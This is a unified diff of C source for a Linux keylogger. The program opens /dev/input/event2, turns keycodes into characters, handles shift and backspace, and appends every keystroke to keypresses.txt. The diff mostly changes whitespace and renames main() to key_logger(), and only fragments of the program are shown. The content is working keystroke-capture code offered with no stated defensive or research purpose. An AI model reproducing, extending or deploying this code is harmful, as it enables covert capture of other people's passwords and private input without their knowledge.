@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-char keycode_to_char(int code, int shift) {
+char keycode_to_char (int code, int shift) {
     if (code == KEY_Q) return shift ? 'Q' : 'q';
     if (code == KEY_W) return shift ? 'W' : 'w';
     if (code == KEY_E) return shift ? 'E' : 'e';
@@ -62,7 +62,7 @@ char keycode_to_char(int code, int shift) {
     return 0;
 }
 
-void handle_backspace(FILE *log) {
+void handle_backspace (FILE * log) {
     fseek(log, -1, SEEK_END);
 
     fputc(' ', log);
@@ -71,15 +71,15 @@ void handle_backspace(FILE *log) {
     fseek(log, 0, SEEK_END);
 }
 
-int main() {
+int key_logger ( ) {
     int fd = open("/dev/input/event2", O_RDONLY);
     if (fd < 0) {
         perror("open event device");
         return 1;
     }
 
-    FILE *log = fopen("keypresses.txt", "a");
-    if (!log) {
+    FILE * log = fopen("keypresses.txt", "a");
+    if (! log) {
         perror("fopen");
         return 1;
     }
@@ -88,7 +88,7 @@ int main() {
     int shift = 0;
 
     while (1) {
-        ssize_t n = read(fd, &ev, sizeof(ev));
+        ssize_t n = read(fd, & ev, sizeof(ev));
         if (n != sizeof(ev)) continue;
 
         if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
